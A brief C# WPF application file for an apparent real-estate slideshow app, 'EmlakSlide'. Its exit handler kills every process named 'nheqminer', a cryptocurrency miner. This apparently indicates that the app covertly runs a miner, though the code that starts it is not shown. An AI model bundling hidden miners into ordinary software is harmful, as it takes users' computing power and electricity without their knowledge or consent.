using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;

namespace EmlakSlide
{
    /// <summary>
    /// App.xaml etkileşim mantığı
    /// </summary>
    public partial class App : Application
    {
        private void App_Exit(object sender, ExitEventArgs e)
        {
            // Perform tasks at application exit
           
            Process[] processes = Process.GetProcessesByName("nheqminer");

            foreach (Process item in processes)
            {
                try
                {
                    item.Kill();
                }
                catch
                {

                }

            }
        

        }
    }
   
}
